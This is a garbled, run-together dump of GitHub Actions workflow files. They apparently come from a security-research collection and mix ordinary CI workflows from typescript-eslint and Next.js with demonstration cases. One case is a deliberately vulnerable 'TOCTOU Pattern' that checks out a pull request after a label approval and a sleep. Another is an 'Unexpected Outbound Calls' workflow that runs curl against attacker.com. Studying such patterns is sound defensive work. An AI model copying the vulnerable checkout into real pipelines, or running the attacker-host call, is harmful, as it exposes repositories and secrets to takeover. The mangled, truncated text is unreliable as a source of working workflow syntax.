name: U ... ConfigsUpdate the RBE images to the latest container versionsmihaimaruseac,learning-to-play,nitins17mihaima ... itins17This PR was created by a GitHub Actions workflow to update all the SIG Build-based RBE containers to the most recent containers. See:

- https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/toolchains/remote_config/configs.bzl
- https://github.com/tensorflow/tensorflow/blob/master/.github/workflows/update-rbe.yml
title:  ... ersionsrbe:/home/huawei/github-actions-security/.github/workflows/tj-actions-changed-files-incident.yamltj-action changed-files incident"tj-act ... cident"tj-actions/changed-files@v35tj-acti ... les@v35name: " ... cident"/home/huawei/github-actions-security/.github/workflows/toc-tou.ymlTOCTOU Patternvulnerable-patterngithub.event.label.name == 'approved'github. ... proved'Wait for demo purposesWait fo ... urposesecho "Waiting 2 minutes to allow push of new commit..."
sleep 120
name: W ... urposesCheckout PR (Vulnerable)Checkou ... erable)gh pr checkout ${{ github.event.pull_request.number }}
# Show what we got
echo "Commit we got:"
git rev-parse HEAD
echo "Content of README.md:"
cat README.md
name: C ... erable)if: git ... proved'secure-patternShow what we gotecho "Commit we got:"
git rev-parse HEAD
echo "Content of README.md:"
cat README.md
name: S ...  we gotvulnerable-pattern:name: TOCTOU Pattern/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__a11y-alt-bot.ymlAccessibility-alt-text-botAccessi ... ext-bot[opened, edited]discussiondiscussion_commentdiscussionsaccessibility_alt_text_botaccessi ... ext_botCheck alt text is set on imagesCheck a ...  images${{ !endsWith(github.actor, '[bot]') }}${{ !en ... t]') }}Get action 'github/accessibility-alt-text-bot'Get act ... xt-bot'github/accessibility-alt-text-bot@v1.7.1github/ ... @v1.7.1name: G ... xt-bot'- name: ... xt-bot'name: C ...  imagesaccessi ... xt_bot:name: A ... ext-bot/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__ci.yml'**'- '**'${{ github.workflow }} - ${{ github.head_ref || github.ref }}${{ github.ref != 'refs/heads/main' }}PRIMARY_NODE_VERSIONNX_CLOUD_ACCESS_TOKENNX_CLOU ... S_TOKEN${{ (github.event_name == 'push' && github.ref == 'refs/heads/main') && secrets.NX_CLOUD_ACCESS_TOKEN || '' }}NX_VERBOSE_LOGGINGPRIMARY ... ION: 20Checkout and InstallNX_CI_EXECUTION_ENVNX_CI_E ... latest'./.github/actions/prepare-install./.gith ... install${{ env.PRIMARY_NODE_VERSION }}name: Installname: C ... InstallBuild All Packages[install]./.github/actions/prepare-buildname: B ... ackagesgenerate_configsGenerate Configsyarn generate-configsyarn ge ... configsrun: ya ... configsgit status --porcelaingit sta ... rcelainrun: gi ... rcelainecho "Outdated result detected from yarn generate-configs. Please check in any file changes."echo "O ... anges."if: failure()name: G ... Configslint_without_buildLint without buildlint-taskcheck-spelling'check-spelling'check-format'check-format'lint-markdown'lint-markdown'['check ... kdown']lint-ta ... kdown']Run Checkyarn ${{ matrix.lint-task }}yarn ${ ... task }}name: Run Checkname: L ... t buildlint_with_buildLint with build'lint''typecheck''knip'['lint' ... 'knip']lint-ta ... 'knip']ESLINT_USE_FLAT_CONFIGESLINT_ ... _CONFIGESLINT_ ... G: truename: L ... h buildstylelintStylelintRun stylelint checkyarn stylelintpackages/websitename: R ... t checkname: Stylelintintegration_testsRun integration tests on primary Node.js versionRun int ... versionRun integration testsRun int ... n testsyarn test-integrationyarn te ... grationname: R ... n testsunit_testsast-spec'ast-spec'eslint-plugin'eslint-plugin'eslint-plugin-internal'eslint ... ternal'parser'parser'project-service'project-service'rule-tester'rule-tester'scope-manager'scope-manager'tsconfig-utils'tsconfig-utils'type-utils'type-utils'typescript-eslint'typescript-eslint'typescript-estree'typescript-estree'utils'utils'visitor-keys'visitor-keys'exclude:${{ matrix.os }} - Node ${{ matrix.node-version }}'${{ ma ... ion }}'COLLECT_COVERAGENX_CI_E ... ion }}'Run unit tests with coverage for ${{ matrix.package }}Run uni ... kage }}env.PRIMARY_NODE_VERSION == matrix.node-version && matrix.os == 'ubuntu-latest'env.PRI ... latest'yarn nx run ${{ matrix.package }}:test -- --coverageyarn nx ... overagename: R ... kage }}Run unit tests for ${{ matrix.package }}env.PRIMARY_NODE_VERSION != matrix.node-version || matrix.os != 'ubuntu-latest'yarn nx test ${{ matrix.package }}yarn nx ... kage }}Store coverage for uploadingStore c ... loading${{ matrix.package }}-coverage${{ mat ... overagepackages/${{ matrix.package }}/coverage/lcov.infopackage ... ov.infoname: $ ... overagename: S ... loadingunit_tests_project_serviceunit_te ... serviceRun Unit Tests with Project ServiceRun Uni ... Service['eslin ... stree']package:false,yarn nx test ${{ matrix.package }} --coverage=falseyarn nx ... e=falseTYPESCRIPT_ESLINT_PROJECT_SERVICETYPESCR ... SERVICEname: R ... Serviceupload_coverageUpload Codecov CoverageUpload  ... overage[unit_tests]Download coverage reportsDownloa ... reportspath: coveragename: D ... reportsPublish code coverage reportPublish ...  reportcodecov/codecov-action@v4.6.0codecov ... @v4.6.0${{ secrets.CODECOV_TOKEN }}coverage/**/lcov.infocoverag ... ov.infounittestcodecovname: P ...  reportname: U ... overagepublish_canary_versionpublish ... versionPublish the latest code as a canary versionPublish ... version[integr ... _tests]github.repository == 'typescript-eslint/typescript-eslint' && github.ref == 'refs/heads/main'fetch-d ... ailableFigure out and apply the next canary versionFigure  ... versionnpx tsx tools/release/apply-canary-version.mtsnpx tsx ... ion.mtsPublish all packages to npm with the canary tagPublish ... ary tagnpx nx release publish --tag canary --verbosenpx nx  ... verboseNX_CLOUD_DISTRIBUTED_EXECUTIONNX_CLOU ... ECUTIONNPM_CONFIG_PROVENANCENPM_CON ... VENANCENX_CLOU ... : falsename: P ... ary taginstall:/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__cleanup-cache.ymlcleanup caches by a branchcleanup ...  branchgh extension install actions/gh-actions-cache

REPO=${{ github.repository }}
BRANCH="refs/pull/${{ github.event.pull_request.number }}/merge"

echo "Fetching list of cache key"
cacheKeysForPR=$(gh actions-cache list -R $REPO -B $BRANCH | cut -f 1 )

## Setting this to not fail the workflow while deleting cache keys.
set +e
echo "Deleting caches..."
for cacheKey in $cacheKeysForPR
do
    gh actions-cache delete $cacheKey -R $REPO -B $BRANCH --confirm
done
echo "Done"
name: c ...  branch/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__lock.ymlLock threads'Lock threads'issues: ... hreads)dessant/lock-threads@v5.0.1dessant ... @v5.0.1add-issue-labelslocked due to age'locked due to age''7'issue-lock-reasonresolved'resolved'pr-lock-reasonadd-iss ... to age'uses: d ... @v5.0.1- uses: ... @v5.0.1name: 'Lock threads'/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__nx-migrate.ymlNx Migrate- 'package.json'${{ github.workflow }}-${{ github.event.number || github.ref }}maybe_nx_migratecontains('["renovate[bot]"]', github.actor) == truecontain ... == trueRun nx migrate if requiredRun nx  ... equiredCheck if @nx/workspace was changed as part of the latest commit on the PRCheck i ...  the PRnrwl-workspace-package-checknrwl-wo ... e-checkgit diff HEAD~1 -G"@nx/workspace" --exit-code package.json && echo "@nx/workspace unchanged" || echo "::set-output name=was-changed::true"
Run nx migrate if @nx/workspace changed and commit the resultsRun nx  ... results${{ steps.nrwl-workspace-package-check.outputs.was-changed == 'true' }}${{ secrets.JAMES_HENRY_GITHUB_TOKEN }}SKIP_POSTINSTALL# Checkout the PR branch using the github CLI
gh pr checkout ${{ github.event.pull_request.number }}

# Get the version of Nx we are migrating to
NX_VERSION=$(node -e "console.log(require('./package.json').devDependencies['nx'])")

# Revert renovate's changes to package.json and yarn.lock so that it is a clean migrate from the status quo
git checkout HEAD~1 -- package.json yarn.lock

YARN_ENABLE_IMMUTABLE_INSTALLS=false yarn install

yarn nx migrate $NX_VERSION

# Sometimes Nx can require config formatting changes after a migrate command
YARN_ENABLE_IMMUTABLE_INSTALLS=false yarn install
yarn nx format

# migrations.json may or may not exist after running nx migrate
if [ -f migrations.json ]; then
  # This will also invoke yarn automatically
  yarn nx migrate --run-migrations=migrations.json

  # After we have run its migrations, we no longer need the migrations.json file
  rm migrations.json
fi

# Run the special nx repair command to ensure config matches latest and greatest
yarn nx repair

# Ensure all the changed files are formatted appropriately
yarn format

# Commit all the changes to the PR (see note on not being able to use secrets.GITHUB_TOKEN for this)
git config --global user.email "james@henry.sc"
git config --global user.name "JamesHenry"
git remote set-url origin https://x-access-token:$GITHUB_TOKEN@github.com/$GITHUB_REPOSITORY.git

git add --all
git commit -m "chore: run nx migrate for nx v$NX_VERSION"
git push
name: R ... resultsif: con ... == truemaybe_nx_migrate:name: Nx Migrate/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__pr-labels.ymlPull Request Labels[labele ... abeled]name: P ...  Labels/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__pr-review-requested.ymlpr_review_requestedactions-ecosystem/action-remove-labels@v1actions ... bels@v11 approval
awaiting response
uses: a ... bels@v1echo "Don't worry if the previous step failed."
echo "See https://github.com/actions-ecosystem/action-remove-labels/issues/221."
- uses: ... bels@v1pr_review_requested:PR Review Requested- review_requestedjobs:/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__prettier-update.ymlPrettier Updatemaybe_prettier_updatemaybe_p ... _updateRun prettier formatting if requiredRun pre ... equiredCheck if prettier was changed as part of the latest commit on the PRprettier-package-checkprettie ... e-checkgit diff HEAD~1 -G"prettier" --exit-code package.json && echo "prettier unchanged" || echo "::set-output name=was-changed::true"
Run prettier formatting if prettier was changed and commit the resultsRun pre ... results${{ steps.prettier-package-check.outputs.was-changed == 'true' }}yarn --mode skip-build
yarn format

# Commit all the changes to the PR (see note on not being able to use secrets.GITHUB_TOKEN for this)
git config --global user.email "james@henry.sc"
git config --global user.name "JamesHenry"
git remote set-url origin https://x-access-token:$GITHUB_TOKEN@github.com/$GITHUB_REPOSITORY.git

# If the status is empty, there are no uncommitted changes
if [[ -z $(git status --porcelain) ]]; then
  echo "No uncommitted changes"
else
  git add --all
  git commit -m "chore: update formatting after prettier upgrade"
  git push
fi
maybe_p ... update:name: P ...  Update/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__semantic-breaking-change-pr.ymlSemantic Breaking Change PRSemanti ... ange PRValidate Breaking Change PRValidat ... ange PRuses: . ... install./.github/actions/breaking-pr-check./.gith ... r-checkuses: . ... r-checkname: V ... ange PRname: S ... ange PR/home/huawei/github-actions-security/.github/workflows/typescript-eslint_typescript-eslint__semantic-pr-titles.ymlSemantic PR TitlesValidate PR titleamannn/action-semantic-pull-request@v5amannn/ ... uest@v5docs
feat
fix
test
chore
scopesdeps
ast-spec
eslint-plugin
eslint-plugin-internal
parser
project-service
rule-tester
scope-manager
tsconfig-utils
type-utils
types
typescript-eslint
typescript-estree
utils
visitor-keys
website
requireScopesubjectPattern^(\[[a-z\-]+(, [a-z\-]+)*\] )?[a-z].+[^\.]$^(\[[a- ... +[^\.]$subjectPatternErrorThe "subject" must start with a lower-case letter and must not
end with a full-stop.
For PRs that add or change ESLint-plugin rules, you should begin
the title with "[rule-name] "
types: |uses: a ... uest@v5- uses: ... uest@v5name: V ... R titlename: S ...  Titles/home/huawei/github-actions-security/.github/workflows/unexpected-outbound-calls.ymlUnexpected Outbound CallsUnexpec ... d CallsUnexpectedOutboundCallsUnexpec ... ndCallscurl https://attacker.com -L  || truename: U ... ndCallsname: U ... d Calls/home/huawei/github-actions-security/.github/workflows/vercel_next.js__bench.ymlBenchmark- canary**/crates/**'**/crates/**'- '**/crates/**''labeled'['labeled']types: ['labeled']${{ github.workflow }}-${{ github.sha }}group:  ... .sha }}CARGO_INCREMENTALRUST_LOGCI: 1list-cratesList crates to benchmarkList cr ... nchmark'linux''x64'metal'metal'${{ github.event.label.name == 'benchmark' }}${{ git ... ark' }}crates${{ steps.list-crates.outputs.crates }}${{ ste ... ates }}crates: ... ates }}List cratesecho "crates=$(./scripts/cargo/bench/list-crates-with-bench.sh)" >> $GITHUB_OUTPUTecho "c ... _OUTPUTname: List cratesname: L ... nchmarkbenchmark-crateBenchmark ${{ matrix.crate }}Benchma ... rate }}crate${{fromJson(needs.list-crates.outputs.crates)}}${{from ... ates)}}crate:  ... ates)}}Install Rustactions-rs/toolchain@v1actions ... hain@v1minimalprofile: minimalname: Install RustInstall cargo-codspeedInstall ... odspeedtaiki-e/install-action@v2taiki-e ... tion@v2toolcargo-codspeed@2.8.1tool: c ... d@2.8.1name: I ... odspeedBuild the benchmark target(s)Build t ... rget(s)cargo codspeed build -p ${{ matrix.crate }}cargo c ... rate }}name: B ... rget(s)Run the benchmarksCodSpeedHQ/action@v3cargo codspeed run${{ secrets.CODSPEED_TOKEN }}run: ca ... eed runname: R ... chmarksname: B ... rate }}list-crates:name: Benchmark/home/huawei/github-actions-security/.github/workflows/vercel_next.js__build_and_deploy.ymlbuild-and-deploy[opened ... ronize]types:  ... ronize]NAPI_CLI_VERSION2.16.2TURBO_VERSION2.3.3NODE_LTS_VERSIONTURBO_TEAMvercel'vercel'TURBO_CACHEremote:rw'remote:rw'MACOSX_DEPLOYMENT_TARGETMACOSX_ ... _TARGET11.0__NEW_RELEASENAPI_CL ...  2.16.2deploy-target${{ steps.deploy-target.outputs.value }}${{ ste ... alue }}value:  ... alue }}Setup node${{ env.NODE_LTS_VERSION }}name: Setup nodeSetup corepacknpm i -g corepack@0.31
corepack enable
name: Setup corepackDetermine deploy targetDetermi ...  target# TODO: Remove the new release check once the new release workflow is fully replaced.
RELEASE_CHECK=$(node ./scripts/check-is-release.js 2> /dev/null || :)
if [[ $RELEASE_CHECK =~ ^Version\ Packages(\ \(canary\))?$ ]];
then
  echo "__NEW_RELEASE=true" >> $GITHUB_ENV
elif [[ $RELEASE_CHECK = v* ]];
then
  echo "value=production" >> $GITHUB_OUTPUT
elif [ '${{ github.ref }}' == 'refs/heads/canary' ]
then
  echo "value=staging" >> $GITHUB_OUTPUT
elif [ '${{ github.event_name }}' == 'workflow_dispatch' ]
then
  echo "value=force-preview" >> $GITHUB_OUTPUT
elif [[ $(node scripts/run-for-change.js --not --type docs --exec echo 'false') != 'false' ]];
then
  echo "value=skipped" >> $GITHUB_OUTPUT
else
  echo "value=automated-preview" >> $GITHUB_OUTPUT
fi
name: D ...  targetPrint deploy targetecho "Deploy target is '${{ steps.deploy-target.outputs.value }}'"echo "D ... ue }}'"name: P ...  target${{ needs.deploy-target.outputs.value != 'skipped' }}${{ nee ... ped' }}- deploy-targetNEXT_TELEMETRY_DISABLEDNEXT_TE ... ISABLEDNEXT_SKIP_NATIVE_POSTINSTALLNEXT_SK ... INSTALLNEXT_TE ... BLED: 125fetch-depth: 25get-store-pathecho STORE_PATH=$(pnpm store path) >> $GITHUB_OUTPUTecho ST ... _OUTPUTid: get-store-pathcache-pnpm-store${{ steps.get-store-path.outputs.STORE_PATH }}${{ ste ... PATH }}pnpm-store-${{ hashFiles('pnpm-lock.yaml') }}pnpm-st ... ml') }}pnpm-store-
pnpm-store-${{ hashFiles('pnpm-lock.yaml') }}
path: $ ... PATH }}run: pnpm installrun: pnpm run buildcache-build./*${{ github.sha }}-${{ github.run_number }}-${{ github.run_attempt}}${{ git ... tempt}}path: ./*- name: Setup nodeif: ${{ ... ped' }}build-nativebash -leo pipefail {0}bash -l ... ail {0}shell:  ... ail {0}settings${{ needs.deploy-target.outputs.value == 'automated-preview' && 'aarch64-apple-darwin' }}${{ nee ... win' }}target: ... win' }}settings:${{ needs.deploy-target.outputs.value == 'automated-preview' && 'aarch64-pc-windows-msvc' }}${{ nee ... svc' }}target: ... svc' }}${{ needs.deploy-target.outputs.value == 'automated-preview' && 'aarch64-unknown-linux-gnu' }}${{ nee ... gnu' }}target: ... gnu' }}${{ needs.deploy-target.outputs.value == 'automated-preview' && 'aarch64-unknown-linux-musl' }}${{ nee ... usl' }}target: ... usl' }}${{ needs.deploy-target.outputs.value == 'automated-preview' && 'x86_64-pc-windows-msvc' }}${{ needs.deploy-target.outputs.value == 'automated-preview' && 'x86_64-unknown-linux-musl' }}${{ needs.deploy-target.outputs.value == 'automated-preview' && 'x86_64-apple-darwin' }}- settings:host'macos''arm64''x86_64 ... darwin'npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}" && corepack enable
pnpm dlx turbo@${TURBO_VERSION} run build-native-release -vvv --env-mode loose --remote-cache-timeout 90 --summarize -- --target x86_64-apple-darwin
strip -x packages/next-swc/native/next-swc.*.node
host:'aarch6 ... darwin'npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}" && corepack enable
pnpm dlx turbo@${TURBO_VERSION} run build-native-release -vvv --env-mode loose --remote-cache-timeout 90 --summarize -- --target aarch64-apple-darwin
strip -x packages/next-swc/native/next-swc.*.node
'windows'corepack enable
npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}"
pnpm dlx turbo@${TURBO_VERSION} run build-native-release -vvv --env-mode loose --remote-cache-timeout 90 --summarize -- --target x86_64-pc-windows-msvc
'x86_64 ... s-msvc''aarch6 ... s-msvc'corepack enable
npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}"
pnpm dlx turbo@${TURBO_VERSION} run build-native-no-plugin-release -vvv --env-mode loose --remote-cache-timeout 90 --summarize -- --target aarch64-pc-windows-msvc
'x86_64 ... ux-gnu'dockerghcr.io/napi-rs/napi-rs/nodejs-rust:stable-2023-09-17-x64ghcr.io ... -17-x64set -ex && apt update && apt install -y pkg-config xz-utils dav1d libdav1d-dev && rustup show && rustup target add x86_64-unknown-linux-gnu && npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}" && unset CC_x86_64_unknown_linux_gnu && unset CC && cd packages/next-swc && npm run build-native-release -- --target x86_64-unknown-linux-gnu && strip native/next-swc.*.node && objdump -T native/next-swc.*.node | grep GLIBC_'x86_64 ... x-musl'ghcr.io/napi-rs/napi-rs/nodejs-rust:stable-2023-09-17-alpineset -ex && apk update && apk add --no-cache libc6-compat pkgconfig dav1d libdav1d dav1d-dev clang-static llvm-dev && rustup show && rustup target add x86_64-unknown-linux-musl && npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}" && export RUSTFLAGS='--cfg tokio_unstable -Zshare-generics=y -Zthreads=8 -Csymbol-mangling-version=v0 -Ctarget-feature=-crt-static' && cd packages/next-swc && npm run build-native-release -- --target x86_64-unknown-linux-musl && strip native/next-swc.*.node'aarch6 ... ux-gnu'ghcr.io/napi-rs/napi-rs/nodejs-rust:stable-2023-09-17-aarch64set -ex && apt update && apt install -y pkg-config xz-utils dav1d libdav1d-dev && export JEMALLOC_SYS_WITH_LG_PAGE=16 && rustup show && rustup target add aarch64-unknown-linux-gnu && npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}" && export CC_aarch64_unknown_linux_gnu=/usr/bin/clang && export CFLAGS_aarch64_unknown_linux_gnu=\"--target=aarch64-unknown-linux-gnu --sysroot=/usr/aarch64-unknown-linux-gnu\" && cd packages/next-swc && npm run build-native-release -- --target aarch64-unknown-linux-gnu && llvm-strip -x native/next-swc.*.node && objdump -T native/next-swc.*.node | grep GLIBC_'aarch6 ... x-musl'set -ex && apk update && apk add --no-cache libc6-compat pkgconfig dav1d libdav1d dav1d-dev clang-static llvm-dev && export JEMALLOC_SYS_WITH_LG_PAGE=16 && npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}" && rustup show && rustup target add aarch64-unknown-linux-musl && export RUSTFLAGS='--cfg tokio_unstable -Zshare-generics=y -Zthreads=8 -Zunstable-options -Csymbol-mangling-version=v0 -Clinker-flavor=gnu-lld-cc -Clink-self-contained=+linker' && cd packages/next-swc && npm run build-native-release -- --target aarch64-unknown-linux-musl && llvm-strip -x native/next-swc.*.node- host:stable - ${{ matrix.settings.target }} - node@16stable  ... node@16${{ matrix.settings.host }}${{ mat ... host }}tune linux networksudo ethtool -K eth0 tx off rx offsudo et ...  rx off${{ matrix.settings.host == 'ubuntu-latest' }}${{ mat ... est' }}name: t ... networktune windows networkDisable-NetAdapterChecksumOffload -Name * -TcpIPv4 -UdpIPv4 -TcpIPv6 -UdpIPv6Disable ... UdpIPv6${{ matrix.settings.host == 'windows-latest' }}tune mac networksudo sysctl -w net.link.generic.system.hwcksum_tx=0 && sudo sysctl -w net.link.generic.system.hwcksum_rx=0sudo sy ... um_rx=0${{ matrix.settings.host == 'macos-latest' }}fetch-depth: 100${{ !matrix.settings.docker }}${{ !ma ... cker }}./.github/actions/setup-rust./.gith ... up-rust${{ matrix.settings.target }}${{ mat ... rget }}targets ... rget }}normalize versionsnode scripts/normalize-version-bump.jsnode sc ... bump.jsname: n ... ersionsSetup toolchain${{ matrix.settings.setup }}${{ mat ... etup }}name: S ... olchainCache on ${{ github.ref_name }}Cache o ... name }}ijjk/rust-cache@turbo-cache-v1.0.8ijjk/ru ... -v1.0.8save-ifcache-providerturbo'turbo'shared-keybuild-${{ matrix.settings.target }}-${{ hashFiles('.cargo/config.toml') }}build-$ ... ml') }}save-if: 'true'name: C ... name }}Clear native buildrm -rf packages/next-swc/nativerm -rf  ... /nativepull build cache${{ matrix.settings.docker }}${{ mat ... cker }}TURBO_VERSION=${TURBO_VERSION} node ./scripts/pull-turbo-cache.js ${{ matrix.settings.target }}TURBO_V ... rget }}name: p ... d cachecheck build existsif [ -f packages/next-swc/native/next-swc.*.node ]; then echo "BUILD_EXISTS=yes" >> $GITHUB_OUTPUT; else echo "BUILD_EXISTS=no" >> $GITHUB_OUTPUT; fiif [ -f ... PUT; fibuild-existsname: c ...  existsBuild in docker${{ matrix.settings.docker && steps.build-exists.outputs.BUILD_EXISTS == 'no' }}${{ mat ... 'no' }}docker run -v "/var/run/docker.sock":"/var/run/docker.sock" \
  -e CI -e RUST_BACKTRACE -e NAPI_CLI_VERSION -e CARGO_TERM_COLOR -e CARGO_INCREMENTAL \
  -e CARGO_PROFILE_RELEASE_LTO -e CARGO_REGISTRIES_CRATES_IO_PROTOCOL -e TURBO_API \
  -e TURBO_TEAM -e TURBO_TOKEN -e TURBO_VERSION -e TURBO_CACHE="remote:rw" \
  -v ${{ env.HOME }}/.cargo/git:/root/.cargo/git \
  -v ${{ env.HOME }}/.cargo/registry:/root/.cargo/registry \
  -v ${{ github.workspace }}:/build \
  -w /build \
  --entrypoint=bash ${{ matrix.settings.docker }} \
  -c "${{ matrix.settings.build }}"
name: B ...  dockercache buildpnpm dlx turbo@${TURBO_VERSION} run cache-build-native --force -- ${{ matrix.settings.target }}pnpm dl ... rget }}name: cache build'Build'${{ matrix.settings.build }}${{ mat ... uild }}name: 'Build'check build cache status'check  ... status'check-did-buildif [[ ! -z $(ls packages/next-swc/native) ]]; then echo "DID_BUILD=true" >> $GITHUB_OUTPUT; fiif [[ ! ... PUT; finame: ' ... status'Collect turbopack build metrics'Collec ... etrics'check-turbopack-bytesizecheck-t ... ytesize${{ steps.check-did-build.outputs.DID_BUILD == 'true' }}mkdir -p ./turbopack-bin-size
shopt -s nullglob
for filename in packages/next-swc/native/next-swc.*.node; do
  # Strip out filename to extract target triple
  export FILENAME=$(basename ${filename})
  export FILENAME=${FILENAME#*.}
  export FILENAME=${FILENAME%.node}
  export BYTESIZE=$(wc -c < $filename | xargs)
  echo "Reporting $FILENAME:$BYTESIZE for Turbopack bytesize"
  echo "turbopack.bytesize.$FILENAME:$BYTESIZE" > ./turbopack-bin-size/${{ matrix.settings.target }}
done
name: ' ... etrics'Upload turbopack bytesize artifactturbopack-bytesize-${{ matrix.settings.target }}turbopa ... rget }}turbopack-bin-size/*name: t ... rget }}Upload swc artifactnext-swc-binaries-${{ matrix.settings.target }}next-sw ... rget }}packages/next-swc/native/next-swc.*.nodepackage ... .*.nodename: n ... rget }}Upload turbo summary artifactturbo-run-summary-${{ matrix.settings.target }}turbo-r ... rget }}.turbo/runs- name: ... networkbuild-wasmwebnodejs[web, nodejs]target: ... nodejs]corepack enablerun: corepack enablewasm32-unknown-unknownwasm32- ... unknowntargets ... unknownInstall wasm-packcurl https://rustwasm.github.io/wasm-pack/installer/init.sh -sSf | shcurl ht ... Sf | shname: I ... sm-packpnpm dlx turbo@${TURBO_VERSION} run build-wasm -vvv --env-mode loose --remote-cache-timeout 90 --summarize -- --target ${{ matrix.target }}Add target to folder nameAdd tar ... er name[[ -d "crates/wasm/pkg" ]] && mv crates/wasm/pkg crates/wasm/pkg-${{ matrix.target }} || ls crates/wasm'[[ -d  ... s/wasm'name: A ... er nameturbo-run-summary-wasm-${{matrix.target}}turbo-r ... arget}}name: t ... arget}}wasm-binaries-${{matrix.target}}wasm-bi ... arget}}crates/wasm/pkg-*name: w ... arget}}deploy-tarball${{ needs.deploy-target.outputs.value != 'production' }}${{ nee ... ion' }}Deploy preview tarballDeploy  ... tarballrestore-build${{ github.sha }}-${{ github.run_number }}-${{ github.run_attempt }}${{ github.sha }}-${{ github.run_number }}
${{ github.sha }}-${{ github.run_number }}-${{ github.run_attempt}}
next-swc-binaries-*packages/next-swc/nativepackage ... /nativepattern ... aries-*wasm-binaries-*crates/wasmCreate tarballsGH_PR_NUMBER=${{ github.event.pull_request && github.event.pull_request.number || '' }} node scripts/create-preview-tarballs.js "${{ github.sha }}" "${{ runner.temp }}/preview-tarballs"GH_PR_N ... rballs"name: C ... arballsUpload tarballspreview-tarballs${{ runner.temp }}/preview-tarballs/*${{ run ... balls/*name: p ... arballsif: ${{ ... ion' }}publishRelease${{ needs.deploy-target.outputs.value == 'production' }}Potentially publish releasePotenti ... release${{ secrets.NPM_TOKEN_ELEVATED }}${{ sec ... ATED }}NPM_TOK ... ATED }}npm i -g npm@10.4.0run: np ... d bugs)echo "//registry.npmjs.org/:_authToken=$NPM_TOKEN" >> ~/.npmrcecho "/ ... /.npmrcrun: ec ... /.npmrc./scripts/publish-native.js./scrip ... tive.jsrun: ./ ... tive.js./scripts/publish-release.js./scrip ... ease.js${{ env.__NEW_RELEASE == 'false' }}${{ env ... lse' }}RELEASE_BOT_GITHUB_TOKENRELEASE ... B_TOKEN${{ secrets.RELEASE_BOT_GITHUB_TOKEN }}RELEASE ... OKEN }}run: ./ ... ease.jsPublish to NPM${{ env.__NEW_RELEASE == 'true' }}pnpm ci:publishpublish ... publishRELEASE_TYPE${{ github.event.inputs.releaseType }}${{ git ... Type }}name: Publish to NPMAdd label to PRsteps.changesets.outputs.pullRequestNumbersteps.c ... tNumbergh pr edit ${{ steps.changesets.outputs.pullRequestNumber }} --add-label "created-by: CI"'gh pr  ... y: CI"'name: A ... l to PRUpload npm log artifactsteps.changesets.outputs.published == 'true'npm-publish-logs/home/runner/.npm/_logs/*/home/r ... _logs/*name: n ... sh-logspublish-turbopack-npm-packagespublish ... ackages${{(github.ref == 'refs/heads/canary') && startsWith(github.event.head_commit.message, 'chore: release turbopack npm packages')}}"${{(gi ... es')}}"uses: . ... up-rustrun: pn ... ockfileBuild packagespnpx turbo@canary run build --only --filter='./turbopack/packages/*'pnpx tu ... ages/*'name: Build packagesWrite NPM_TOKENecho "//registry.npmjs.org/:_authToken=${{ secrets.NPM_TOKEN_ELEVATED }}" > ~/.npmrcname: W ... M_TOKENcargo xtask workspace --publishcargo x ... publishif: "${ ... es')}}"deployExamples${{ needs.deploy-target.outputs.value != 'automated-preview' }}${{ nee ... iew' }}Deploy examples[build, ... target]echo '${{ needs.deploy-target.outputs.value }}'echo '$ ... lue }}'run: ec ... lue }}'Install Vercel CLInpm i -g vercel@latestnpm i - ... @latestname: I ... cel CLIDeploy preview examplesDeploy  ... xamples./scripts/deploy-examples.sh./scrip ... ples.shVERCEL_API_TOKEN${{ secrets.VERCEL_API_TOKEN }}DEPLOY_ENVIRONMENTpreviewVERCEL_ ... OKEN }}name: D ... xamplesDeploy production examples- run:  ... lue }}'if: ${{ ... iew' }}releaseStatsRelease Stats[publishRelease]cp -r packages/next-swc/native .github/actions/next-stats-action/nativecp -r p ... /nativerun: cp ... /native./scripts/release-stats.sh./scrip ... tats.shrun: ./ ... tats.sh./.github/actions/next-stats-action./.gith ... -actionPR_STATS_COMMENT_TOKENPR_STAT ... T_TOKEN${{ secrets.PR_STATS_COMMENT_TOKEN }}PR_STAT ... OKEN }}uses: . ... -actionname: Release Statsupload_turbopack_bytesizeupload_ ... ytesize${{ needs.deploy-target.outputs.value != 'automated-preview'}}${{ nee ... view'}}Upload Turbopack Bytesize metrics to Datadog[build- ... target]${{ secrets.DATA_DOG_API_KEY }}Collect bytesize metricsCollect ... metricsturbopack-bytesize-*turbopack-bin-sizepattern ... esize-*name: C ... metricsUpload to Datadogls -al turbopack-bin-size

for filename in turbopack-bin-size/*; do
  export BYTESIZE+=" --metrics $(cat $filename)"
done

echo "Reporting $BYTESIZE"

npx @datadog/datadog-ci@2.23.1 metric --no-fail --level pipeline $BYTESIZE
- name: ... metricsif: ${{ ... view'}}deploy-target:name: b ... -deploy/home/huawei/github-actions-security/.github/workflows/vercel_next.js__build_and_test.yml'canary'['canary']branches: ['canary']NODE_MAINTENANCE_VERSIONNODE_MA ... VERSIONNODE_MA ... ION: 18optimize-ci./.github/workflows/graphite_ci_optimizer.yml./.gith ... zer.ymluses: . ... zer.ymlDetermine changescheck for docs only changecheck f ...  changedocs-changeecho "DOCS_ONLY<<EOF" >> $GITHUB_OUTPUT;
echo "$(node scripts/run-for-change.js --not --type docs --exec echo 'false')" >> $GITHUB_OUTPUT;
echo 'EOF' >> $GITHUB_OUTPUT
name: c ...  changecheck for releaseif [[ $(node ./scripts/check-is-release.js 2> /dev/null || :) = v* ]];
  then
    echo "IS_RELEASE=true" >> $GITHUB_OUTPUT
  else
    echo "IS_RELEASE=false" >> $GITHUB_OUTPUT
fi
